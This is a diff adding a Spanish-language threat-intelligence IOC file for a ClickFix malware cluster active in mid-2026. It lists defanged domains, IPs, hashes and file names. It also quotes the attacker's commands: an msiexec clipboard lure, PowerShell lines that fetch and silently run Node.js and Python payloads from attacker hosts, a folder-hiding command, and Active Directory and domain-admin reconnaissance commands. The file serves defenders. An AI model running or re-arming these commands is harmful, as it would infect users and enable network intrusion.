@@ -1,0 +1,116 @@
+====================================================================
+IOCs — ClickFix Cluster (BlueVoyant "Lorem Ipsum" / Supper / Vanilla Tempest)
+Fuente: Field Effect — "ClickFix cluster: observed activity in recent campaigns"
+Ventana observada: mediados de junio a julio 2026
+Extraído: 2026-08-25 | Formato: DEFANGED (no clickeable)
+====================================================================
+
+------------------------------------------------
+DOMINIOS
+------------------------------------------------
+seephotoalbum[.]com
+beastcloudsecurity[.]com
+bestpopularimages[.]com
+photocategories[.]com
+topimagechecker[.]com
+editdocumentfree[.]com
+newpopularimages[.]com
+topphotoalbum[.]com
+opendocumentonline[.]com
+peekyourphoto[.]com
+hwid-cloude[.]us[.]com
+cloudbreachdetection[.]com
+cooldogshistory[.]com
+digitalpoint[.]com/members/trytodetectme[.]1134520
+digitalpoint[.]com/members/documentpublisher[.]1139897
+
+------------------------------------------------
+DIRECCIONES IP
+------------------------------------------------
+144[.]172[.]103[.]194
+146[.]19[.]49[.]4
+149[.]56[.]95[.]157
+91[.]236[.]230[.]237
+130[.]49[.]155[.]201
+146[.]19[.]49[.]71
+145[.]239[.]54[.]189
+193[.]243[.]147[.]137
+45[.]83[.]180[.]237
+45[.]129[.]199[.]77
+
+------------------------------------------------
+URLs MALICIOSAS
+------------------------------------------------
+hxxp://hwid-cloude[.]us[.]com\YourSystemID
+hxxps://cloudbreachdetection[.]com/get_verify?i=13011
+hxxps://cooldogshistory[.]com/get_verify?i=1753
+
+------------------------------------------------
+HASHES SHA256
+------------------------------------------------
+72cd20b5a398febd6868e1b88e86afb5a8163969b8cd7bb7895f52fc9ea4424d  (PowerShell Loader)
+7545d737202df6d90118e04a963acbd1b16a1f4e0a1c173bef7ab9489efdcd16  (Update.js)
+2104e7018aa9fd2507cc036e2aa4ff80e613a156ab1cb78604773d447298a854  (PowerShell Loader)
+f80d8f5950086a053c68dcdcb5902f2ad8b8e4fcf400855c316aef09fe0f55e5  (script de ejecución en loop)
+6304d348b45154b4d6d7c3f1176304d2c0112d23c08a0178fa6d0b74a967a85d  (mscoree.dll)
+32b1f676dd98449a47ba671c4bdd6269e070a8fb349d1c02404a3784b4d4c77f  (captcha.py)
+d092ac012ccb75416802ee697a5f65b2c0545d047a20869c53124db9e37f3dcd  (script de persistencia)
+4cbaac416954408f37ebcc97ba4c08facef86c20b3cbec9324a4932b5fc1acbb  (dui70.dll)
+
+------------------------------------------------
+NOMBRES DE ARCHIVO / EJECUTABLES
+------------------------------------------------
+3DPDFMakerSmart.exe
+XPFix.exe
+NET Runtime Optimization Service.exe
+mscoree.dll
+LockScreenContentServer.exe
+Update.js
+Captcha.py
+dui70.dll
+node-v7.10.1-win-x64            (Node.js legítimo, abusado para sideloading)
+python.exe (v3.5.0)             (Python legítimo, abusado para ejecución)
+
+------------------------------------------------
+PAYLOAD DE PORTAPAPELES (ClickFix lure)
+------------------------------------------------
+"C:\WINDOWS\system32\MsieXEc.ExE" /pAckAGe hxxp://hwid-cloude[.]us[.]com\YourSystemID:7543729---To-Complete-Verification---PRESS-ENTER-or-OK /Q
+
+------------------------------------------------
+COMANDOS POWERSHELL — Campaña 2 (NodeJS)
+------------------------------------------------
+Invoke-WebRequest -Uri 'hxxps://cloudbreachdetection[.]com/get_verify?i=13011' -OutFile 'Update.zip'
+Invoke-WebRequest -Uri 'hxxps://nodejs[.]org/dist/v7.10.1/node-v7.10.1-win-x64.zip'
+Start-Process 'C:\ProgramData\node-v7.10.1-win-x64\node.exe' -ArgumentList 'C:\ProgramData\Update.js'
+
+------------------------------------------------
+COMANDOS POWERSHELL — Campaña 3 (Python)
+------------------------------------------------
+cls;Write-Host "Starting verifying..." -ForegroundColor Green;$w=New-Object Net.WebClient;$w.DownloadFile('hxxps://cooldogshistory[.]com/get_verify?i=1753',"$env:TEMP\a.zip");$w=New-Object Net.WebClient;$w.DownloadFile('hxxps://www[.]python[.]org/ftp/python/3.5.0/python-3.5.0rc4-embed-amd64.zip',"$env:TEMP\b.zip");Expand-Archive "$env:TEMP\b.zip" -DestinationPath "C:\ProgramData\1";Expand-Archive "$env:TEMP\a.zip" -DestinationPath "C:\ProgramData\";$p=New-Object Diagnostics.ProcessStartInfo;$p.FileName='C:\ProgramData\1\python.exe';$p.Arguments='C:\ProgramData\Captcha.py';$p.WindowStyle='Hidden';$p.CreateNoWindow=$true;$p.UseShellExecute=$false;[Diagnostics.Process]::Start($p)|Out-Null;Write-Host "I am not a robot - Cloudflare ID: f280b80182c4442d"
+
+------------------------------------------------
+OTROS ARTEFACTOS
+------------------------------------------------
+Carpeta oculta:     C:\ProgramData\DotNetOptimizer_xa312vpO
+Comando ocultar:    attrib.exe +h +s C:\ProgramData\DotNetOptimizer_xa312vpO
+Endpoint C2:        /api/init/<guid>   (POST con archivos JFIF)
+
+Consulta AD (recon de usuarios con descripción):
+$searcher = [adsisearcher]'(&(objectCategory=user)(description=*))'; $searcher.PropertiesToLoad.Add('samaccountname'); $searcher.PropertiesToLoad.Add('description'); $results = $searcher.FindAll(); foreach($result in $results) { $result.Properties['samaccountname'][0] + ' - ' + $result.Properties['description'][0] }
+
+------------------------------------------------
+COMANDOS DE DESCUBRIMIENTO / LOLBins (post-compromiso)
+------------------------------------------------
+Nltest.exe /dclist:
+Net.exe group "domain admins" /domain
+Nltest /domain_trusts
+Ipconfig.exe
+Net.exe user <user> /domain
+Net.exe localgroup administrators
+
+====================================================================
+NOTA: node-v7.10.1, Python 3.5.0 y nodejs.org/python.org son binarios
+y sitios LEGÍTIMOS abusados por el atacante (LOLBin / DLL sideloading).
+No bloquear los dominios oficiales; sí vigilar su descarga+ejecución
+desde rutas anómalas como C:\ProgramData\.
+====================================================================
